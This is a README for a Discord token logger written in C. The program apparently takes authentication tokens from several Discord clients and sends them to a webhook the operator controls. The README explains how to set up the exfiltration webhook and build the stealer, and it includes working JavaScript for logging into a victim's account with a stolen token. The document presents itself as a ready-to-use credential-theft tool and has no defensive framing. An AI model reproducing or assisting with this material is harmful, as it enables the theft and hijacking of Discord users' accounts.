# Simple Discord Token Logger in C 

### Logs tokens from discord, discord canary, ptb, etc

## Usage
- Edit the webhook url in config.h which is in the config folder to your own webhook url.
- You may also add paths to other discord clients in config.c in the same folder. 
- To compile with Microsoft Visual Studio, you will need meson and ninja. 
- To compile with tcc, which I have included in the repo, for your convenience, you only need to run build.bat.

## How to get a webhook url
- Go to the channel you want to send the tokens to.
- Click on the settings icon next to the channel name.
- Click on the integrations tab.
- Click on webhooks.
- Click on new webhook.
- Give it a name and a profile picture if you want.
- Copy the webhook url and paste the part /api/webhooks/1234/example.. in the config.h file.

## How to login to discord accounts via token
- Go to https://discord.com/login
- Open the developer tools by pressing F12.
- Go to the console tab.
- Paste the following [code](https://gist.github.com/m-Phoenix852/b47fffb0fd579bc210420cedbda30b61) in the console tab and press enter.
```js
let token = "your token";

function login(token) {
    setInterval(() => {
      document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
      location.reload();
    }, 2500);
  }

login(token);
``` 

You can also use the [Discord Token Login Chrome Extention](https://github.com/gastersaurus/Discord-Token-Login-Chrome-Extention) to login to discord accounts via token.

## Building with the provided gui builder:
- The gui builder is a simple gui that take care of the compiling process for you. 
- You will not need to install a compiler or any other dependencies.
- You can download the gui builder from releases.
- The GUI will only requires you to enter the webhook url. No need to edit the config.h file or anything else.

## Building with Microsoft Visual Studio:
### Requirements:
##### Visual Studio 2019
##### Meson
##### Ninja
- From the start menu, search for "x64 Native Tools Command Prompt for VS 2019" and open it.
- Navigate to the directory where you cloned the repo.
- Run the following commands:
```
meson wrap install openssl
meson setup build 
cd build
ninja
```
- The executable will be in the build folder.

## Building with tcc:
### Requirements: None
- Run build.bat
- The executable will be in the bin folder which will be opened automatically after the build process is done.

